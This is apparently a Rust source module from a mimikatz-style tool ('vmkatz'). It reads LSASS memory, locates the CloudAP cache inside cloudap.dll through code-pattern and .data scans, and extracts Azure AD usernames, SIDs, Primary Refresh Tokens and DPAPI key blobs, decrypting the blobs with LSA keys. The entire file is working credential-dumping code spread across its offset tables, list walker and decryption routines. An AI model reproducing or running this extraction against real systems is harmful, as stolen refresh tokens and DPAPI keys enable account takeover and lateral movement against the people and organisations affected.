use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{Arch, CloudApCredential, read_ptr, is_valid_user_ptr};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// KIWI_CLOUDAP_LOGON_LIST_ENTRY offset variants.
struct CloudApLogonOffsets {
    luid: u64,
    cache_entry: u64,
}

const CLOUDAP_LOGON_VARIANTS: &[CloudApLogonOffsets] = &[
    CloudApLogonOffsets { luid: 0x18, cache_entry: 0x30 }, // Win10 1903+
    CloudApLogonOffsets { luid: 0x1C, cache_entry: 0x38 }, // Win11
    CloudApLogonOffsets { luid: 0x14, cache_entry: 0x28 }, // Win10 1507
];

const CLOUDAP_LOGON_VARIANTS_X86: &[CloudApLogonOffsets] = &[
    CloudApLogonOffsets { luid: 0x10, cache_entry: 0x20 }, // Win10 x86 1903+
    CloudApLogonOffsets { luid: 0x0C, cache_entry: 0x18 }, // Win10 x86 1507
];

/// KIWI_CLOUDAP_CACHE_LIST_ENTRY per-arch offsets.
struct CacheEntryOffsets {
    toname: u64,
    toname_len: usize, // always 130 = 65 wchar_t
    sid: u64,
    to_determine: u64,
    cb_prt: u64,
    prt: u64,
}

/// x64 cache entry offsets.
const CACHE_ENTRY_OFFSETS_X64: CacheEntryOffsets = CacheEntryOffsets {
    toname: 0x68, toname_len: 130, sid: 0xF0, to_determine: 0x108, cb_prt: 0x118, prt: 0x120,
};

/// x86 cache entry offsets (4-byte pointers shrink all pointer fields):
const CACHE_ENTRY_OFFSETS_X86: CacheEntryOffsets = CacheEntryOffsets {
    toname: 0x38, toname_len: 130, sid: 0x90, to_determine: 0xA0, cb_prt: 0xAC, prt: 0xB0,
};

/// Extract CloudAP credentials from cloudap.dll (unified x64/x86).
///
/// CloudAP handles Azure AD authentication and stores Primary Refresh Tokens (PRT)
/// and DPAPI-NG protected session keys. The cache is a doubly-linked list in
/// cloudap.dll's .data section, found via a code pattern in .text (x64) or
/// .data scan (x86).
pub fn extract_cloudap_credentials_arch(
    vmem: &dyn VirtualMemory,
    dll_base: u64,
    _dll_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, CloudApCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, dll_base)?;

    // x64: try .text pattern scan first, fall back to .data section scan
    // x86: no .text patterns available, go directly to .data scan
    let list_addr = match arch {
        Arch::X64 => {
            match pe.find_section(".text") {
                Some(text) => {
                    let text_base = dll_base + text.virtual_address as u64;
                    match patterns::find_pattern(
                        vmem,
                        text_base,
                        text.virtual_size,
                        patterns::CLOUDAP_CACHE_PATTERNS,
                        "CloudApCache",
                    ) {
                        Ok((pattern_addr, _)) => {
                            patterns::find_list_via_lea(vmem, pattern_addr, "CloudAP cache list")?
                        }
                        Err(e) => {
                            log::debug!(
                                "CloudAP .text pattern scan failed ({}), trying .data fallback",
                                e
                            );
                            find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?
                        }
                    }
                }
                None => find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?,
            }
        }
        Arch::X86 => find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?,
    };

    log::info!("CloudAP cache list at 0x{:x} (arch={:?})", list_addr, arch);
    walk_cloudap_cache(vmem, list_addr, keys, arch)
}

/// Auto-detect CloudAP logon entry variant by probing offsets on first entry.
fn detect_logon_offsets(vmem: &dyn VirtualMemory, first_entry: u64, arch: Arch) -> &'static CloudApLogonOffsets {
    let variants = match arch {
        Arch::X64 => CLOUDAP_LOGON_VARIANTS,
        Arch::X86 => CLOUDAP_LOGON_VARIANTS_X86,
    };
    for variant in variants {
        // LUID should be a small nonzero value
        let luid = match vmem.read_virt_u64(first_entry + variant.luid) {
            Ok(l) => l,
            Err(_) => continue,
        };
        // LUID low part is typically < 0x100000 for user sessions
        if luid == 0 || luid > 0xFFFF_FFFF {
            continue;
        }
        // cacheEntry should be a valid heap pointer
        let cache_ptr = match read_ptr(vmem, first_entry + variant.cache_entry, arch) {
            Ok(p) => p,
            Err(_) => continue,
        };
        if is_valid_user_ptr(cache_ptr, arch) {
            return variant;
        }
    }
    match arch {
        Arch::X64 => &CLOUDAP_LOGON_VARIANTS[0],
        Arch::X86 => &CLOUDAP_LOGON_VARIANTS_X86[0],
    }
}

/// Walk the CloudAP cache linked list and extract entries.
fn walk_cloudap_cache(
    vmem: &dyn VirtualMemory,
    list_addr: u64,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, CloudApCredential)>> {
    let mut results = Vec::new();

    let head_flink = read_ptr(vmem, list_addr, arch)?;
    if head_flink == 0 || head_flink == list_addr {
        log::info!("CloudAP: cache list is empty");
        return Ok(results);
    }

    let offsets = detect_logon_offsets(vmem, head_flink, arch);
    log::debug!(
        "CloudAP: using logon offsets luid=0x{:x} cache_entry=0x{:x}",
        offsets.luid,
        offsets.cache_entry
    );

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let cache_entry_ptr = read_ptr(vmem, current + offsets.cache_entry, arch).unwrap_or(0);

        if is_valid_user_ptr(cache_entry_ptr, arch) {
            if let Some(cred) = extract_cache_entry(vmem, cache_entry_ptr, keys, arch) {
                log::info!(
                    "CloudAP: LUID=0x{:x} user={} domain={} dpapi_key_len={}",
                    luid,
                    cred.username,
                    cred.domain,
                    cred.dpapi_key.len()
                );
                results.push((luid, cred));
            }
        }

        current = match read_ptr(vmem, current, arch) {
            Ok(f) => f,
            Err(_) => break,
        };
    }

    log::info!("CloudAP: found {} cache entries", results.len());
    Ok(results)
}

/// Extract credential data from a single KIWI_CLOUDAP_CACHE_LIST_ENTRY.
fn extract_cache_entry(
    vmem: &dyn VirtualMemory,
    entry_addr: u64,
    keys: &CryptoKeys,
    arch: Arch,
) -> Option<CloudApCredential> {
    let ce = match arch {
        Arch::X64 => &CACHE_ENTRY_OFFSETS_X64,
        Arch::X86 => &CACHE_ENTRY_OFFSETS_X86,
    };

    // Read toname (wchar_t[65]) for the account name
    let username = read_toname(vmem, entry_addr + ce.toname, ce.toname_len);

    // Read the Sid pointer for domain info
    let sid_ptr = read_ptr(vmem, entry_addr + ce.sid, arch).unwrap_or(0);
    let domain = if is_valid_user_ptr(sid_ptr, arch) {
        let (sid_str, dom) = read_sid_string(vmem, sid_ptr);
        if !sid_str.is_empty() && username.is_empty() {
            log::debug!("CloudAP: using SID {} as fallback", sid_str);
        }
        dom
    } else {
        "AzureAD".to_string()
    };

    // Read the toDetermine pointer (contains DPAPI key blob)
    let to_determine_ptr = read_ptr(vmem, entry_addr + ce.to_determine, arch).ok()?;

    // Try to extract DPAPI key from toDetermine structure
    let dpapi_key = if is_valid_user_ptr(to_determine_ptr, arch) {
        extract_dpapi_key_from_blob(vmem, to_determine_ptr, keys)
    } else {
        Vec::new()
    };

    // Read PRT from cbPRT + PRT pointer
    let prt = read_prt(vmem, entry_addr, ce, arch);

    // Only return if we have something useful
    if dpapi_key.is_empty() && username.is_empty() && prt.is_empty() {
        return None;
    }

    Some(CloudApCredential {
        username,
        domain,
        dpapi_key,
        prt,
    })
}

/// Read the toname wchar_t[65] field from a cache entry.
fn read_toname(vmem: &dyn VirtualMemory, toname_addr: u64, toname_len: usize) -> String {
    let raw = match vmem.read_virt_bytes(toname_addr, toname_len) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    // Find null terminator in UTF-16LE
    crate::utils::utf16le_decode(&raw)
}

/// Read PRT from cbPRT/PRT fields.
fn read_prt(vmem: &dyn VirtualMemory, entry_addr: u64, ce: &CacheEntryOffsets, arch: Arch) -> String {
    let cb_prt = match vmem.read_virt_u32(entry_addr + ce.cb_prt) {
        Ok(s) if s > 0 && s <= 0x4000 => s as usize,
        _ => return String::new(),
    };
    let prt_ptr = match read_ptr(vmem, entry_addr + ce.prt, arch) {
        Ok(p) if is_valid_user_ptr(p, arch) => p,
        _ => return String::new(),
    };
    let buf = match vmem.read_virt_bytes(prt_ptr, cb_prt) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };

    // PRT is typically ASCII/UTF-8 JWT or hex-encoded
    if let Ok(s) = std::str::from_utf8(&buf) {
        if !s.is_empty() && s.len() > 10 {
            return s.trim_end_matches('\0').to_string();
        }
    }

    // Fallback: hex-encode the raw buffer
    if buf.iter().any(|&b| b != 0) {
        let limit = buf.len().min(512);
        return format!("[raw] {}", hex::encode(&buf[..limit]));
    }

    String::new()
}

/// Extract DPAPI key from the toDetermine structure.
///
/// The toDetermine pointer leads to a structure containing an encrypted
/// DPAPI key blob. The blob format:
///   +0x00: cbKey (u32) - size of encrypted key
///   +0x04: padding
///   +0x08: pbKey (encrypted data, cbKey bytes)
fn extract_dpapi_key_from_blob(
    vmem: &dyn VirtualMemory,
    blob_addr: u64,
    keys: &CryptoKeys,
) -> Vec<u8> {
    // Read the key size from the blob header
    let cb_key = match vmem.read_virt_u32(blob_addr) {
        Ok(s) if s > 0 && s <= 0x200 => s as usize,
        _ => return Vec::new(),
    };

    // Read the encrypted key data
    let enc_data = match vmem.read_virt_bytes(blob_addr + 0x08, cb_key) {
        Ok(d) => d,
        Err(_) => return Vec::new(),
    };

    // Try to decrypt using LSA keys
    match crate::lsass::crypto::decrypt_credential(keys, &enc_data) {
        Ok(d) if !d.is_empty() => d,
        _ => {
            log::debug!(
                "CloudAP: DPAPI key decryption failed at 0x{:x}, storing encrypted blob",
                blob_addr
            );
            enc_data
        }
    }
}

/// Try to read a SID from memory and convert to a user-friendly string.
fn read_sid_string(vmem: &dyn VirtualMemory, sid_addr: u64) -> (String, String) {
    let header = match vmem.read_virt_bytes(sid_addr, 8) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };
    let sub_count = header.get(1).copied().unwrap_or(0) as usize;
    let sub_data = match vmem.read_virt_bytes(sid_addr + 8, sub_count * 4) {
        Ok(d) => d,
        Err(_) => return (String::new(), String::new()),
    };
    let sid_str = super::types::format_sid_from_bytes(&header, &sub_data);
    if sid_str.is_empty() {
        (String::new(), String::new())
    } else {
        (sid_str, "AzureAD".to_string())
    }
}

/// Scan cloudap.dll .data section for the cache LIST_ENTRY head (x64 and x86).
fn find_cloudap_cache_in_data(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    dll_base: u64,
    arch: Arch,
) -> Result<u64> {
    let data_sec = pe.find_section(".data").ok_or_else(|| {
        crate::error::VmkatzError::PatternNotFound(".data section in cloudap.dll".to_string())
    })?;

    let data_base = dll_base + data_sec.virtual_address as u64;
    let data_size = std::cmp::min(data_sec.virtual_size as usize, 0x10000);
    let data = vmem.read_virt_bytes(data_base, data_size)?;
    let step = arch.ptr_size() as usize;

    let variants = match arch {
        Arch::X64 => CLOUDAP_LOGON_VARIANTS,
        Arch::X86 => CLOUDAP_LOGON_VARIANTS_X86,
    };

    log::debug!(
        "CloudAP: scanning .data for cache list: base=0x{:x} size=0x{:x} arch={:?}",
        data_base,
        data_size,
        arch,
    );

    for off in (0..data_size.saturating_sub(step * 2)).step_by(step) {
        let flink = match arch {
            Arch::X86 => super::types::read_u32_le(&data, off).unwrap_or(0) as u64,
            Arch::X64 => super::types::read_u64_le(&data, off).unwrap_or(0),
        };
        let blink = match arch {
            Arch::X86 => super::types::read_u32_le(&data, off + step).unwrap_or(0) as u64,
            Arch::X64 => super::types::read_u64_le(&data, off + 8).unwrap_or(0),
        };

        let list_addr = data_base + off as u64;

        // Self-referencing empty list
        if flink == list_addr && blink == list_addr {
            if off < 0x1000 {
                log::debug!(
                    "CloudAP: found empty cache list at 0x{:x} (self-referencing)",
                    list_addr
                );
                return Ok(list_addr);
            }
            continue;
        }

        if !is_valid_user_ptr(flink, arch) || !is_valid_user_ptr(blink, arch) {
            continue;
        }
        // Must point to heap, not within the DLL
        if flink >= dll_base && flink < dll_base + 0x100000 {
            continue;
        }

        // Validate: first entry's Flink
        let entry_flink = match read_ptr(vmem, flink, arch) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
            continue;
        }

        // Validate: try each variant to find a valid LUID + cacheEntry
        let mut found = false;
        for variant in variants {
            let luid = match vmem.read_virt_u64(flink + variant.luid) {
                Ok(l) => l,
                Err(_) => continue,
            };
            if luid == 0 || luid > 0xFFFFFFFF {
                continue;
            }

            let cache_entry = match read_ptr(vmem, flink + variant.cache_entry, arch) {
                Ok(p) => p,
                Err(_) => continue,
            };
            if is_valid_user_ptr(cache_entry, arch) {
                log::debug!(
                    "CloudAP: found cache list candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x}",
                    list_addr,
                    flink,
                    luid
                );
                found = true;
                break;
            }
        }
        if found {
            return Ok(list_addr);
        }
    }

    Err(crate::error::VmkatzError::PatternNotFound(
        "CloudAP cache list in cloudap.dll .data section".to_string(),
    ))
}
